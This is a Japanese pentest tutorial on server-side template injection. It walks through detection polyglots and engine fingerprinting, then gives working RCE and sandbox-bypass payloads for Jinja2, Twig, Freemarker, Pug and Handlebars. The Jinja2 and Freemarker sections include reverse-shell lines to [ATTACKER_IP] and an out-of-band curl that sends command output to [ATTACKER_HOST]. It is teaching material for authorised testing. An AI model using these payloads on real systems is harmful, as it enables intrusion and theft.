# サーバーサイドテンプレートインジェクション（SSTI）

> **スコープ**: ユーザー入力がテンプレートエンジンの「式」として評価される脆弱性。検出ポリグロット注入〜エンジン特定〜エンジン別の式評価〜RCE 昇格〜サンドボックス脱出までを扱う。クライアント側 JS への注入（DOM XSS）は `XSS.md`、文字列展開を伴わない単純な反射は SSTI ではないので XSS 側を参照。

## 着火条件

- ユーザー入力が画面に**そのまま反射される**箇所がある（XSS の検出と入口は同じ）
- かつ、入力に `{{7*7}}` / `${7*7}` 等の式を入れると**計算結果（`49`）が表示される** → 文字列でなく式として評価されている
- 名前・件名・テンプレート編集・通知メール本文・エラーページなど、サーバー側でテンプレートにユーザー値を**連結**していそうな箇所

## 環境前提

- 実行環境: テスター端末（ペイロード作成）/ ターゲット（テンプレート評価）
- 必要なツール: `curl` または Burp Suite（リクエスト送信・差し替え）/ `tplmap`（SSTI 自動検出・悪用。別途 `git clone https://github.com/epinna/tplmap`・標準搭載ではない）/ OOB 確認用に `python3 -m http.server` または `interactsh-client`
- オフライン環境では tplmap が使えないことが多いので、本ファイルの手動ポリグロット → エンジン特定 → 手動 RCE の手順を主とする

## 先に確認すること

- **XSS と SSTI の切り分けを最初に行う**: `{{7*7}}` を入れて画面に `49` が出れば SSTI、`{{7*7}}` がそのまま文字列で出れば XSS 側の検討に回す。式評価の有無がすべての分岐の起点になる。

**攻撃者の思考トレース:** 反射点を見つけたら、まず XSS ペイロードではなく**数式ポリグロット**を入れる。`49` が返ればサーバー側テンプレート評価が確定し、ここから先は「どのエンジンか」を式の方言差で特定 → エンジン固有のオブジェクト到達経路で RCE、という一本道になる。エンジン特定を飛ばして RCE ペイロードを乱射すると、エンジン違いで全部失敗して脆弱性を見落とす。

---

## 1. 検出（数式ポリグロットの注入）

**コマンド（ペイロード）:**

```
# [Attacker] まず式が評価されるかを確認（各記法を順に入れる）
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
${{7*7}}
*{7*7}

# [Attacker] エラーを誘発してスタックトレースからエンジン名を漏らす polyglot
${{<%[%'"}}%\
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| いずれかの記法で `49` が表示される | SSTI 成立（式評価あり）| §2 エンジン特定へ |
| `{{7*7}}` がそのまま文字列で表示される | テンプレート評価なし | SSTI ではない → `XSS.md` の検討へ |
| polyglot でスタックトレース / 例外クラス名が出る | エンジン名・言語が露出 | 例外クラス名（`freemarker.*` / `jinja2.*` / `twig.*` 等）で §2 を確定 |
| `49` だが HTML エスケープされて表示 | 評価はされるが出力はエスケープ | RCE は可能（評価側の問題）。§3 以降へ |

**注意:** 式評価の確認は `7*7=49` のように「偶然一致しない計算」を使う。`{{7+7}}` でも良いが、アプリ側の別処理で `14` が出る誤検知を避けるため掛け算が無難。HTML エスケープされていても**サーバー側で式が評価されている**事実が重要で、RCE 可否はエスケープと無関係。

---

## 2. エンジン特定（方言差で絞り込む）

エンジンごとに通る記法・通らない記法が違う。`{{7*7}}` と `${7*7}` のどちらが通るか、さらに文字列演算の挙動で枝刈りする。

**コマンド（判定用ペイロード）:**

```
# [Attacker] {{ }} 系が通った場合の枝刈り
{{7*'7'}}        # → 7777777 なら Jinja2(Python) / 49 なら Twig(PHP)
{{7*7}}          # Jinja2 / Twig / Nunjucks / Handlebars 系で 49

# [Attacker] ${ } 系が通った場合
${7*7}           # Freemarker(Java) / Java EL / Spring SpEL / Thymeleaf
#{7*7}           # Pug(Node.js) / Ruby 式展開

# [Attacker] <%= %> が通った場合
<%= 7*7 %>       # ERB(Ruby) / EJS(Node.js)
```

**観測される出力 → 次のアクション（判定表）:**

| 記法 | 結果 | 推定エンジン | 次のアクション |
|---|---|---|---|
| `{{7*'7'}}` | `7777777`（文字列反復）| **Jinja2 / Nunjucks（Python/Node）** | §3 Jinja2 へ |
| `{{7*'7'}}` | `49`（数値）| **Twig（PHP）** | §4 Twig へ |
| `${7*7}` | `49` | **Freemarker / SpEL / Java EL（Java）** | §5 Freemarker へ |
| `#{7*7}` | `49` | **Pug（Node.js）** | §6 Pug へ |
| 例外クラスに `freemarker.` | - | Freemarker 確定 | §5 へ |
| 例外クラスに `jinja2.` / `TemplateSyntaxError` | - | Jinja2 確定 | §3 へ |
| 例外クラスに `Twig\Error` | - | Twig 確定 | §4 へ |

**注意:** Mustache / Handlebars も `{{ }}` を使うが**ロジックレス**設計で `{{7*7}}` は評価されない（変数参照のみ）。`{{7*7}}` が無反応で `{{name}}` だけ展開されるなら §7（ロジックレス系）へ。エンジン特定が曖昧なときは tplmap の `--engine` 自動判定に投げてもよいが、本番のインターネット遮断環境では手動判定を主とする。

---

## 3. Jinja2 / Nunjucks（Python / Node.js）の悪用

Python の Jinja2 はオブジェクトの内省（`__class__` → `__mro__` → `__subclasses__`）から `os` モジュールに到達して RCE する。Flask アプリで頻出。

**コマンド（ペイロード）:**

```
# [Attacker] グローバルから os に最短到達（環境により通るものを選ぶ）
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}

# [Attacker] config 経由（Flask の組み込みオブジェクト）
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# [Attacker] サンドボックスで属性アクセスが弾かれる場合は |attr フィルタで迂回
{{ ()|attr('\x5f\x5fclass\x5f\x5f') }}
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `uid=...(...)` が表示される | RCE 成立 | リバースシェルへ移行（下記注意）→ `Command_Injection.md` のシェル取得・安定化を流用 |
| `SecurityError` / `is undefined` | SandboxedEnvironment で属性制限 | §8 サンドボックス脱出へ |
| `__globals__` が空 / 例外 | 到達経路が違う | `cycler` / `lipsum` / `request` / `config` を順に入れ替える |

**注意:** `popen(...).read()` で出力を画面に返せる。出力が返らない blind 型なら OOB（`curl http://[ATTACKER_HOST]:8000/?x=$(id|base64)`）に切り替える。リバースシェルは `{{ ... popen('bash -c "bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1"') }}` の形でテンプレ式内に埋める。`__class__` 等が文字列フィルタされる場合は `\x5f` 16 進エスケープや `|attr()` で迂回する。

---

## 4. Twig（PHP）の悪用

Twig は PHP のテンプレートエンジン（Symfony / Drupal / Craft CMS 等で使用）。バージョンで RCE 経路が変わる。

**コマンド（ペイロード）:**

```
# [Attacker] 新しめの Twig: filter / map / sort に PHP 関数を渡す
{{ ['id']|filter('system') }}
{{ ['id']|map('system')|join(',') }}
{{ ['id', 0]|sort('system') }}
{{ ['id']|reduce('system') }}

# [Attacker] 古い Twig 1.x: registerUndefinedFilterCallback でコールバック登録
{{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}

# [Attacker] Symfony アプリなら app グローバル経由で内部に到達できることがある
{{ app.request.server.all|join(',') }}
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `uid=...` が返る | RCE 成立 | リバースシェル化 → `Command_Injection.md` のシェル取得へ |
| `Unknown "filter"` 等 | その Twig バージョンに当該フィルタが無い | 別バージョン経路（`map` / `sort` / `reduce` / `registerUndefinedFilterCallback`）を順に試す |
| サンドボックス例外（`SecurityError`）| Twig Sandbox 拡張が有効 | 許可タグ・許可フィルタの範囲内での情報漏洩に限定 → §8 |

**注意:** `system` 以外に `exec` / `passthru` / `shell_exec` も渡せる。`disable_functions` で PHP 側が関数を無効化していると RCE は不発になるので、複数関数を順に試す。Twig はデフォルトでは sandbox **無効**なので、テンプレート編集機能があると低権限から RCE に直結しやすい。

---

## 5. Freemarker / SpEL（Java）の悪用

Freemarker は Java のテンプレートエンジン。`?new()` ビルトインで任意クラスをインスタンス化して `Execute` に到達する。

**コマンド（ペイロード）:**

```
# [Attacker] Execute ユーティリティを new してコマンド実行
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${"freemarker.template.utility.Execute"?new()("id")}

# [Attacker] ObjectConstructor 経由（Execute が封じられている場合）
${"freemarker.template.utility.ObjectConstructor"?new()("java.lang.ProcessBuilder","id").start()}

# [Attacker] Spring SpEL（${ } が SpEL の場合）
${T(java.lang.Runtime).getRuntime().exec("id")}
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `uid=...` / プロセス出力が返る | RCE 成立 | リバースシェル化（下記注意）|
| `Execute is not allowed` / `?new` 禁止 | Freemarker の `new` ビルトインがブロック設定 | `ObjectConstructor` / `api` 経由を試す → 不可なら §8 |
| `T(...)` が評価される | SpEL（Spring）| `T(java.lang.Runtime)...exec(...)` で RCE |

**注意:** `Runtime.exec("id")` は単純コマンドしか通らない（シェル展開・パイプ不可）。パイプやリダイレクトを使うリバースシェルは `exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1"})` のように配列形式で渡す。Freemarker は `new` ビルトインを `TemplateClassResolver` でブロックする緩和があり、新しめの設定では §8 の経路検討が必要。

---

## 6. Pug（Node.js）の悪用

Pug（旧 Jade）は Node.js のテンプレートエンジン。`#{ }` 補間または行頭 `-`（コード行）から `global.process` 経由で `child_process` に到達する。

**コマンド（ペイロード）:**

```
# [Attacker] 補間経由
#{ global.process.mainModule.require('child_process').execSync('id').toString() }
#{ root.process.mainModule.require('child_process').execSync('id') }

# [Attacker] 改行 + コード行注入（入力が複数行を許す場合）
\n= global.process.mainModule.require('child_process').execSync('id')
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `uid=...` が返る | RCE 成立 | リバースシェル化 → `Command_Injection.md`（Node.js シェル）参照 |
| `process is not defined` | `global.` 前置が必要 | `global.process` / `root.process` に変える |
| 改行が無視される | 単一行コンテキスト | `#{ }` 補間形式に寄せる |

**注意:** Node 系（Pug / EJS / Nunjucks / Handlebars）は `child_process.execSync` が共通の sink。`execSync('id').toString()` で出力を文字列化しないとオブジェクト表記で返ることがある。EJS は `<%= %>` / `<%- %>`、注入経路が違うだけで到達先（`child_process`）は同じ。

---

## 7. Mustache / Handlebars（ロジックレス系）の悪用

Mustache は純粋なロジックレスで**式評価ができない**ため、基本は変数の文脈漏洩（context disclosure）や HTML 非エスケープ（`{{{ }}}`）経由の XSS に留まる。Handlebars はヘルパ（`with` / `lookup`）を悪用したプロトタイプ到達で RCE に至るケースがある。

**コマンド（ペイロード）:**

```
# [Attacker] Mustache: 非エスケープ出力（XSS 化。RCE ではない）
{{{ <img src=x onerror=alert(1)> }}}

# [Attacker] Handlebars: with + lookup で constructor 経由のコード実行（公開 PoC の型）
{{#with "s" as |string|}}
  {{#with (string.sub.apply 0 (lookup string.sub "constructor"))}}
  {{/with}}
{{/with}}
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `{{7*7}}` が評価されず `{{name}}` だけ展開 | ロジックレス（Mustache 等）| 式 RCE は不可 → `{{{ }}}` 非エスケープ経由の XSS（`XSS.md`）/ 文脈漏洩に切替 |
| Handlebars で constructor 連鎖が通る | プロトタイプ到達による RCE 成立 | リバースシェル化 |
| `{{{ }}}` で HTML が生 reflect | 非エスケープ出力 | `XSS.md` の格納型／反射型 XSS 経路へ |

**注意:** Mustache での「SSTI」と称される多くは実体が XSS（非エスケープ出力）。RCE を期待してペイロードを乱射せず、まずエンジンがロジックレスかを §2 で確定する。Handlebars の constructor 連鎖はバージョン依存で、公開 advisory の修正済みバージョンでは塞がれている。

---

## 8. サンドボックス脱出・RCE 昇格（共通・上級）

エンジンがサンドボックスモード（Jinja2 `SandboxedEnvironment` / Twig Sandbox / Freemarker `TemplateClassResolver`）で動いていると、§3〜§6 の素直な経路は属性アクセスや `new` で弾かれる。脱出は「許可されたオブジェクトから禁止オブジェクトへの間接到達」を探す問題になる。

**観点（共通の迂回口）:**

```
# [Attacker] Jinja2 SandboxedEnvironment: |attr フィルタと組み込みオブジェクトで属性制限を迂回
{{ request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os') }}
{{ lipsum.__globals__.os.popen('id').read() }}      # lipsum は globals を晒しやすい
{{ get_flashed_messages.__globals__ }}              # Flask の別エントリポイント

# [Attacker] 文字列フィルタ回避（'__' や 'class' がブロックされている場合）
{{ ()|attr('\x5f\x5fclass\x5f\x5f') }}              # 16進エスケープ
{{ ()['__cl''ass__'] }}                              # 文字列分割で署名一致を崩す
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `lipsum` / `get_flashed_messages` で globals が出る | サンドボックス外の globals に到達 | そこから `os` → `popen` で §3 と同様に RCE |
| `|attr` 経由で `__class__` が取れる | 文字列ベースのブロックを迂回成立 | 内省チェーンを再構築して RCE |
| すべて `SecurityError` | 強固なサンドボックス | RCE は断念し、テンプレート内で読める変数（秘密鍵・設定値）の漏洩に切替 → `../Credential_Discovery.md` |

**注意:** サンドボックス脱出は公開済みの bypass（バージョン依存）に強く依存する。`{{ jinja2.__version__ }}` 等でバージョンを取得し、当該バージョンに対する公開 bypass の有無を確認する。脱出できなくても、テンプレートのスコープに渡っている変数（DB 接続文字列・API キー・`config`）の漏洩自体が finding になる。

---

## 実アプリでの典型パターン（case study 観点）

SSTI は「**ユーザーまたは低権限ユーザーがテンプレート文字列そのものを制御できる**」設計で多発する。実在製品で繰り返し現れた型：

- **CMS のテーマ／テンプレート編集機能（Freemarker・Java 系 CMS）**: 管理 UI からテーマファイルを編集でき、その内容が Freemarker として評価される。テンプレート編集権限が想定より低い権限に開いていると、§5 の `?new()` 経路で RCE に直結する。
- **フォームビルダー／通知メールテンプレート（Twig・PHP 系 CMS のプラグイン）**: フォーム送信値や通知メール本文テンプレートにユーザー制御値が Twig として評価される。§4 の `filter('system')` 系で RCE。プラグイン経由で本体 CMS の sandbox 設定が効かないことがある。
- **共通シグナル**: 「テンプレート」「テーマ」「通知本文」「差し込み変数」「`{{ }}` が使えます」等の UI 文言は、その入力が式評価されるサインなので §1 のポリグロットを最優先で投げる。

> これらは「テンプレート文字列を編集できる機能 × エンジンの sandbox 無効」の組み合わせで成立する一般パターン。製品固有の修正状況は各製品の公開 advisory を確認する。

---

## 刺さらなかったとき（全体）

| 観測される症状 | 推定原因 | 代替手段 |
|---|---|---|
| `{{7*7}}` も `${7*7}` も文字列のまま | テンプレート評価なし（ただの反射）| SSTI ではない → `XSS.md` へ |
| `49` は出るが RCE ペイロードが全部例外 | エンジン特定ミス | §2 をやり直し、文字列演算（`{{7*'7'}}`）で再判定 |
| RCE 経路が `SecurityError` | サンドボックスモード | §8 の迂回 → 不可なら変数漏洩に切替 |
| コマンドは通るがパイプ／リダイレクトが効かない | `Runtime.exec` 等の単純実行 | 配列形式 `{"/bin/bash","-c","..."}` でシェル経由に |
| 出力が画面に返らない | blind 型 | OOB（DNS / HTTP コールバック）に切替 |

---

## 注意点・落とし穴

- **SSTI と XSS の混同に注意**: `{{ }}` が出力に出ても式評価されなければ XSS。先に `7*7` で評価有無を確定する（§1）。
- **エンジン特定を飛ばさない**: 方言違いで RCE ペイロードは全滅する。`{{7*'7'}}` の文字列演算差が Jinja2 と Twig を分ける決定打。
- **sandbox の有無で難易度が激変する**: Twig / Jinja2 は通常 sandbox 無効だが、明示的にサンドボックス化されると §8 の公開 bypass 依存になる。
- **RCE できなくても finding**: テンプレートスコープの変数（秘密鍵・接続文字列）漏洩は単独で報告価値がある。
- **本番でのコマンド実行は影響を最小化する**: 確認は `id` / `hostname` 等の非破壊コマンドに留め、リバースシェルや永続化は事前合意の範囲内で行う。

---

## 関連技術

- 前：反射点・式評価される入力を発見 → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：`{{7*7}}` が文字列のまま反射 → SSTI ではなく XSS → `XSS.md`
- 後：RCE 成立 → リバースシェル取得・安定化 → `Command_Injection.md` / `../../03_Post_Access_Linux/Shell_Stabilization.md`
- 後：サンドボックスで RCE 不可だが変数漏洩 → 認証情報の活用 → `../Credential_Discovery.md`
- 関連：同じ反射入力点での XSS → `XSS.md`
- 関連：式評価系の別経路（XSLT）→ `XSLT_Injection.md`
- 関連：攻撃側の準備（リスナー起動・到達可能 IP の確認）→ `../../06_Concepts/Reverse_Shell.md`
